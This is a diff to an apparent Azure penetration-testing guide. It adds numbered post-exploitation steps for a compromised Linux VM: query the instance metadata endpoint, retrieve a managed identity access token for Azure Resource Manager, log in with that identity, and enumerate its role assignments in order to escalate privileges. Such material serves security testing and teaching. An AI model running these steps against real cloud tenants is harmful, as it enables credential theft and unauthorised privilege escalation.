@@ -253,7 +253,7 @@ Documentation :  https://docs.microsoft.com/en-us/azure/virtual-machines/windows
 
 Once gain root access on the VM, try to request the IMDS.
 
-#### Request information about the VM's compute, network, disk, etc.
+#### 0. Request information about the VM's compute, network, disk, etc.
 ```
 azureadmin@LinuxVM:~# sudo su –
 root@LinuxVM:~# apt update -y
@@ -261,10 +261,24 @@ root@LinuxVM:~# apt install jq -y
 root@LinuxVM:~# curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?apiversion=2020-09-01" | jq
 ```
 
-#### Check whether the VM has an associated managed identity
+#### 1. Check whether the VM has an associated managed identity
 
-If one is used, an access_token will be returned and this could present an opportunity to escalate privileges
+If one is used, an access_token will be returned and this could present an opportunity to escalate privileges to the Azure management plane (Resource Manager). The token can be used to interact with the **Aruze REST APIs**.
 
 ```
 root@LinuxVM:~# curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq
+```
+
+#### 2. On the compromised VM, log in  with the VM's managed identity
+```
+root@LinuxVM:~# az login --identity
+```
+
+### 3. Check the permissions that this identity has
+```
+#Make a request for the LinuxVM resource information and cast it to the appid variable
+root@LinuxVM:~# appid=$(az resource list --query "[?name=='LinuxVM'].identity.principalId" --output tsv)
+
+#Using the appid variable, we will list the role assignments for the subscription, specifically querying for the principal name, role name, type, and scope
+root@LinuxVM:~# az role assignment list --assignee $appid --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName,usertype:principalType, scope:scope}'
 ```
